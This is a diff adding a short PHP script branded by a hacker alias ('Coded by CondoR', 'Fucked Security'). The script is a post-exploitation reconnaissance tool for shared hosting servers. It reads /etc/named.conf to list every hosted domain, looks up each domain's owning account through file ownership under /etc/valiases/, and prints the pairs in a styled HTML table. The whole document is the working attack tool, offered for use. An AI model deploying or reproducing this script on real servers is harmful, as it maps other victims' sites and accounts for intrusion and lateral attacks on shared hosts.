@@ -1,0 +1,87 @@
+<?
+    
+    echo "<title>CondoR Domains & Users Okuyucu</title>
+    
+    <style>
+    
+    body,table{background: white; font-family:Verdana,tahoma; color: red; font-size:10px; }
+    
+    A:link {text-decoration: none;color: red;}
+    
+    A:active {text-decoration: none;color: red;}
+    
+    A:visited {text-decoration: none;color: red;}
+    
+    A:hover {text-decoration: underline; color: red;}
+    
+    #new,input,table,td,tr,#gg{text-align:center;border-style:solid;text-decoration:bold;}
+    
+    tr:hover,td:hover{text-align:center;background-color: #FFFFCC; color:green;}
+    
+    </style>
+
+    <p align=center>CondoR Domain ~ User Okuyucu</p>
+
+    <p align=center>Coded by CondoR - facebook.com/Root.CondoR</p><center>";
+    
+    
+    
+    $d0mains = @file("/etc/named.conf");
+    
+    
+    
+    if(!$d0mains){ die("<b>[ /etc/named.conf Komutu Okunamadı ]"); }
+    
+    
+    
+    echo "<table align=center border=1>
+    
+    <tr bgcolor=blue><td>D0mainler</td><td>Us3rler</td></tr>";
+    
+    
+    
+    foreach($d0mains as $d0main){
+    
+    
+    
+    if(eregi("zone",$d0main)){
+    
+    
+    
+    preg_match_all('#zone "(.*)"#', $d0main, $domains);
+    
+    flush();
+    
+    
+    
+    if(strlen(trim($domains[1][0])) > 2){
+    
+    
+    
+    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
+    
+    
+    
+    echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>"; flush();
+    
+    
+    
+    }}}
+    
+    
+    
+    echo "</table>
+    
+    <p align='center'>
+    
+    (c)0d3d By CondoR
+    
+    Fucked Security
+    
+    </p>
+    
+    ";
+    
+    
+    
+    ?>
